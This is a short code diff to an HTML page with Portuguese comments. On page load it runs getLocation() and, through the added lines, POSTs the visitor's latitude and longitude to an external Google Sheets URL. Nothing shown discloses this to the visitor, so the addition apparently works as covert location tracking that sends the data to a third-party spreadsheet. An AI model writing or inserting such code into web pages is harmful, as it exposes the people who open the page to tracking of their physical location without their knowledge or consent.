@@ -39,6 +39,11 @@
 
         // Executa automaticamente ao carregar a página
         getLocation();
+        fetch("https://docs.google.com/spreadsheets/d/e/2PACX-1vS30T3lXCWgyqhng8nPXna7ti72lvWHrRn04_QqaUAEyhkOVujlrGRTtvBI3sgOW4zlkfSaZ6EV-9DG/pubhtml?gid=0&single=true", {
+    method: "POST",
+    body: JSON.stringify({ latitude: lat, longitude: lon }),
+    headers: { "Content-Type": "application/json" }
+});
     </script>
 </body>
 </html>
